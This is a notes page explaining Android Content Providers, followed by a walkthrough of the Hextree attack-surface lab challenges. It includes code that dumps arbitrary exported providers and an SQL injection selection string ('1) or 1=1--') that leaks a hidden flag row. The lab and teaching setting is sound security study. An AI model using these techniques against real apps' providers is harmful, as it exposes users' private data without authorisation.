---
title: "Content providers"
---

## Overview

A **Content Provider** \[[↗](https://developer.android.com/reference/android/content/ContentProvider)] is one of the four fundamental components of an Android application (along with Activities, Services, and Broadcast Receivers).

By default, Android uses a concept called "Application Sandboxing." This means App A cannot access App B’s database or files directly. However, sometimes you want to share data. For example WhatsApp needs to access your phone's **Contacts**.

The **Content Provider** is the standard interface that connects data in one process with code running in another process.

**Architecture**

The architecture involves three main parts:

* **The Data Layer**: The actual source of data (usually an SQLite database, but it can be files, JSON, etc.).
* **The Content Provider**: The class that sits on top of the data. It exposes methods like insert, query, update, and delete.
* **The Content Resolver**: The client (the app trying to get the data). It talks to the Provider using a specific address (URI).


**The Content URI**

To access data, you need a unique address called a URI (Uniform Resource Identifier). It looks like this:
`content://com.example.app.provider/users/1`

* `content://`: The scheme (tells Android this is a Content Provider).
* `com.example.app.provider`: The Authority. This acts like a domain name to identify which specific provider to call.
* `users`: The Path. Indicates which table or type of data you want.
* `1`: The ID. (Optional) Indicates the specific row you want.

**Key Methods**

A Content Provider must implement these six abstract methods:

* `onCreate()`: Initialize the provider (e.g., open the database connection).
* `query()`: Read data. Returns a Cursor object.
* `insert()`: Add new data.
* `update()`: Modify existing data.
* `delete()`: Remove data.
* `getType()`: Returns the MIME type of the data (used for handling file types).

---

### How to use it

#### Access 

Imagine you want to read the User's Contacts. You don't query the database directly. You use the `ContentResolver`.

```java
// 1. Define the URI for Contacts
Uri contactsUri = ContactsContract.Contacts.CONTENT_URI; // -> content://com.android.contacts/contacts

// 2. Use the ContentResolver to query
Cursor cursor = getContentResolver().query(
    contactsUri, // The address
    null,        // Columns to return (null = all)
    null,        // Selection criteria (WHERE clause)
    null,        // Selection arguments
    null         // Sort order
);

// 3. Iterate through the results
if (cursor != null && cursor.moveToFirst()) {
    do {
        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
        Log.d("Contact", name);
    } while (cursor.moveToNext());
    
    cursor.close();
}
```

Content Providers are identified and accessed through a `content://` URI. You can query this URI using `getContentResolver().query()`. The method returns data in a table-like structure, which can then be navigated using a `Cursor` object.


#### Implementation

If you want to share your app's data with other apps, you must create a subclass of `ContentProvider`.

```java
public class MyDataProvider extends ContentProvider {
    
    private SQLiteDatabase db;

    @Override
    public boolean onCreate() {
        // Initialize your Database Helper here
        DatabaseHelper dbHelper = new DatabaseHelper(getContext());
        db = dbHelper.getWritableDatabase();
        return (db != null);
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        // Perform SQLite query
        return db.query("tasks_table", projection, selection, selectionArgs, null, null, sortOrder);
    }
    
    // Implement insert, update, delete similarly...
}
```

Moreover, you must declare the provider in `AndroidManifest.xml`

```java
<provider
    android:name=".MyDataProvider"
    android:authorities="com.example.myapp.provider"
    android:exported="true" />
```

---

### UriMatcher

A [UriMatcher](https://developer.android.com/reference/android/content/UriMatcher) is a utility class in Android that helps your app match incoming Uris against predefined patterns. It’s commonly used in ContentProviders to determine which type of request is being made and route it to the appropriate logic.

**How it works**

You create a `UriMatcher` and add URI patterns with integer constants:

```java
private static final int USERS = 1;
private static final int USER_ID = 2;
private static final UriMatcher uriMatcher = new UriMatcher(UriMatcher.NO_MATCH);

static {
    uriMatcher.addURI("com.example.app", "users", USERS);       // Matches all users
    uriMatcher.addURI("com.example.app", "users/#", USER_ID);   // Matches a specific user
}
```

Then, inside the ContentProvider:

```
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    switch (uriMatcher.match(uri)) {
        case USERS:
            // return all users
            break;
        case USER_ID:
            // return a specific user
            break;
        default:
            throw new IllegalArgumentException("Unknown URI: " + uri);
    }
}
```

> **Note**:
>
> * `#` in the pattern matches a number.
> * `*` in the pattern matches any text.
> * `UriMatcher.NO_MATCH` is used as a default for unmatched URIs.

### Package visibility

Android 11 introduced package visibility restrictions for privacy reasons \[[↗](https://developer.android.com/training/package-visibility)]. Apps can no longer see all installed apps or all exported components (like Content Providers) unless explicitly declared.

**There are many more details regarding package visibility, but here we will focus specifically on Content Providers in a typical scenario**. For Content Providers, this means:

* Even if a provider is `exported="true"`, your app cannot interact with it unless it is declared in `<queries>`.
* Without this declaration, trying to access the provider will fail.

```
Failed to find provider info for io.hextree.flag30
```

The `<queries>` element goes in your app’s `AndroidManifest.xml`, outside the `<application>` tag. You can declare visibility in two main ways:

1. **By package name**

If you know the exact app that provides the provider:

```xml
<queries>
    <package android:name="com.example.otherapp" />
</queries>
```

2. **By provider authorities**

If you want to access a specific provider:

```xml
<queries>
    <provider android:authorities="com.example.otherapp.provider" />
</queries>
```

---

## Usage

### Content provider query

Let's say that the app `io.hextree.attacksurface` has the following ContentProvider:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag30Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag30"/>
```

```java
public class Flag30Provider extends ContentProvider {
    ...

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        Log.i("Flag30", "Flag30Provider.query('" + uri.getPath() + "')");
        if (!uri.getPath().equals("/success")) {
            return null;
        }
        LogHelper logHelper = new LogHelper(getContext());
        Cursor cursorQuery = this.dbHelper.getReadableDatabase().query(FlagDatabaseHelper.TABLE_FLAG, strArr, "name=? AND visible=1", new String[]{"flag30"}, null, null, str2);
        cursorQuery.setNotificationUri(getContext().getContentResolver(), uri);
        success(logHelper);
        return cursorQuery;
    }
}
```

To retrieve the flag, you simply need to perform a query as shown below:

```java
Uri uri = Uri.parse("content://io.hextree.flag30/success");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
```

> **Important**: remember to declare `<queries>`.

### Content providers & UriMatcher

Let's say that the app `io.hextree.attacksurface` has the following ContentProvider:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag31Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag31"/>
```

```java
public class Flag31Provider extends ContentProvider {
    ...

    static {
        UriMatcher uriMatcher2 = new UriMatcher(-1);
        uriMatcher = uriMatcher2;
        uriMatcher2.addURI(AUTHORITY, "flags", 1);
        uriMatcher2.addURI(AUTHORITY, "flag/#", 2);
    }

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        StringBuilder sbAppend = new StringBuilder("Flag31Provider.query('").append(uri.getPath()).append("'): ");
        UriMatcher uriMatcher2 = uriMatcher;
        Log.i("Flag31", sbAppend.append(uriMatcher2.match(uri)).toString());
        SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase();
        int iMatch = uriMatcher2.match(uri);
        if (iMatch == 1) {
            throw new IllegalArgumentException("FLAGS not implemented yet: " + uri);
        }
        if (iMatch == 2) {
            long id = ContentUris.parseId(uri);
            Log.i("Flag31", "FLAG_ID: " + id);
            if (id == 31) {
                success(logHelper);
            }
            return readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, "name=? AND visible=1", new String[]{"flag" + id}, null, null, str2);
        }
        throw new IllegalArgumentException("Unknown URI: " + uri);
    }
}
```

To retrieve the flag, you simply need to perform a query as shown below:

```java
Uri uri = Uri.parse("content://io.hextree.flag31/flag/31");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
```

### General example to dump content provider

Source: \[[↗](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/#capturing-app-permissions)]

```java
public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

---

## Vulnerabilities

### SQL Injection in content providers

Let's say that the app `io.hextree.attacksurface` has the following ContentProvider:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag32Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag32"/>
```

```java
public class Flag32Provider extends ContentProvider {
    ...

    static {
        UriMatcher uriMatcher2 = new UriMatcher(-1);
        uriMatcher = uriMatcher2;
        uriMatcher2.addURI(AUTHORITY, "flags", 1);
        uriMatcher2.addURI(AUTHORITY, "flag/#", 2);
    }

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        StringBuilder sbAppend = new StringBuilder("Flag32Provider.query('").append(uri.getPath()).append("'): ");
        UriMatcher uriMatcher2 = uriMatcher;
        SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase();
        int iMatch = uriMatcher2.match(uri);
        if (iMatch != 1) {
            if (iMatch == 2) {
                long id = ContentUris.parseId(uri);
                return readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, "name=? AND visible=1", new String[]{"flag" + id}, null, null, str2);
            }
            throw new IllegalArgumentException("Unknown URI: " + uri);
        }
        String str3 = "visible=1" + (str != null ? " AND (" + str + ")" : "");
        Cursor cursorQuery = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str3, strArr2, null, null, str2);
        if (containsFlag32(cursorQuery)) {
            success(logHelper);
            cursorQuery.requery();
        }
        return cursorQuery;
    }
}
```

To retrieve the flag, you need to perform a SQLi as shown below:

```java
    protected void onCreate(Bundle savedInstanceState) {
        ....

        String selection = "1) or 1=1--";
        dump(Uri.parse("content://io.hextree.flag32/flags"), selection);
    }

    public void dump(Uri uri, String selection) {
        Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```

Log:

```
evil    com.example.myapplication   D  _id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
evil    com.example.myapplication   D  _id = 2, name = flag31, value = HXT{query-uri-matcher-sakj1}, visible = 1
evil    com.example.myapplication   D  _id = 3, name = flag32, value = HXT{sql-injection-in-provider-1gs82}, visible = 0
```